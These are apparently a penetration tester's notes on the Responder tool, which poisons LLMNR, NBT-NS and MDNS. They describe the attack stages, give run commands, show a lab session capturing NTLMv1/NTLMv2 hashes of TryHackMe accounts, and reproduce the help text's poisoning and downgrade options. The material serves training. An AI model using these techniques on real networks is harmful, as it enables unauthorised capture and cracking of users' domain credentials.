
https://www.kali.org/tools/responder/

Responder is a sniffing tool used to gain vulnerable credentials from network traffic, including those sent over SMB, HTTP, and other protocols. Responder is also an LLMNR, NBT-NS, and MDNS poisoner.

In a Windows environment, protocols such as LLMNR and NBT-NS can often be easily exploitable. LLMNR (Linked-Local Multicast Name Resolution) is a Windows component that acts as a host discovery method in Windows systems. LLMNR is used very often in Active Directory environments. Local networks have many things on them that we, as penetration testers, can exploit. Windows stores passwords in the Security Accounts Manager (SAM) Database or the Active Directory database in domains, and they are hashed.

![[mceclip0.png]]
##### Stages
1. A Windows server makes an LLMNR request looking for a specific resource.
2. The attacker using the Responder tool provides the Windows server with the IP of the attacker’s machine.
3. The Windows server supplies its domain credentials to the attacker in an attempt to access the specified resource.

### Examples

`responder -I eth0`
`responder -I tun0`


### Example output

```sh
┌──(kali㉿kali)-[~/thm/monikerlink]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.21.31.111]
    Responder IPv6             [fe80::3b67:c794:fba5:622c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-QFM5RU5MFXK]
    Responder Domain Name      [UKT7.LOCAL]
    Responder DCE-RPC Port     [48963]

[+] Listening for events...                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.10.60.5
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
[SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:f76b2d45429fab20:95F23B59A43103A330D085E0CB9A48C3:0101000000000000004E12472560DB016973CD48DC003727000000000200080055004B005400370001001E00570049004E002D00510046004D0035005200550035004D00460058004B0004003400570049004E002D00510046004D0035005200550035004D00460058004B002E0055004B00540037002E004C004F00430041004C000300140055004B00540037002E004C004F00430041004C000500140055004B00540037002E004C004F00430041004C0007000800004E12472560DB010600040002000000080030003000000000000000000000000020000069FB4A3246E22DC3E9D6AB39E54F1100FFCD096E4E621BF85EE50732E28385080A001000000000000000000000000000000000000900220063006900660073002F00310030002E00320031002E00330031002E00310031003100000000000000000000000000           
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
[+] Exiting...
```

more captures
```sh
[LDAP] NTLMv1-SSP Client   : 10.200.80.201
[LDAP] NTLMv1-SSP Username : za.tryhackme.com\svcLDAP
[LDAP] NTLMv1-SSP Hash     : svcLDAP::za.tryhackme.com:568A9B9F5A59B14900000000000000000000000000000000:1DD7195405E372134BB193AAA62674507073B737715D81A0:76afd7de97d9b9a8                                                                                   
[SMB] NTLMv2-SSP Client   : 10.200.80.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:cbc1d26ee75dc4b5:40116E4DB6242F2B07D029EB1734AD36:010100000000000080D2D49AC28EDB01AE0D7593DCF551C80000000002000800510057003100500001001E00570049004E002D0054004D004400410048004C003000530051005400320004003400570049004E002D0054004D004400410048004C00300053005100540032002E0051005700310050002E004C004F00430041004C000300140051005700310050002E004C004F00430041004C000500140051005700310050002E004C004F00430041004C000700080080D2D49AC28EDB01060004000200000008003000300000000000000000000000002000004298E22EECA7B125A0C4E51D7EC473D05916D6DE01A3B4239E2C15B661C484990A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00370039002E00320031000000000000000000                                  
[*] Skipping previously captured hash for ZA\svcFileCopy
[*] Skipping previously captured hash for ZA\svcFileCopy
[*] Skipping previously captured hash for ZA\svcFileCopy

```

### Help

```sh
┌──(kali㉿kali)-[~/thm/monikerlink]
└─$ responder --help
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd

Options:
  --version             show program´s version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                        Poison all requests with another IPv6 address than
                        Responder´s one.
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder´s one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -d, --DHCP            Enable answers for DHCP broadcast requests. This
                        option will inject a WPAD server in the DHCP response.
                        Default: False
  -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
                        response, otherwise a WPAD server will be added.
                        Default: False
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn´t need to be
                        ON. This option is highly effective. Default: False
  -Q, --quiet           Tell Responder to be quiet, disables a bunch of
                        printing from the poisoners. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  --disable-ess         Force ESS downgrade. Default: False
  -v, --verbose         Increase verbosity.
  -t 1e, --ttl=1e       Change the default Windows TTL for poisoned answers.
                        Value in hex (30 seconds = 1e). use '-t random' for
                        random TTL
```
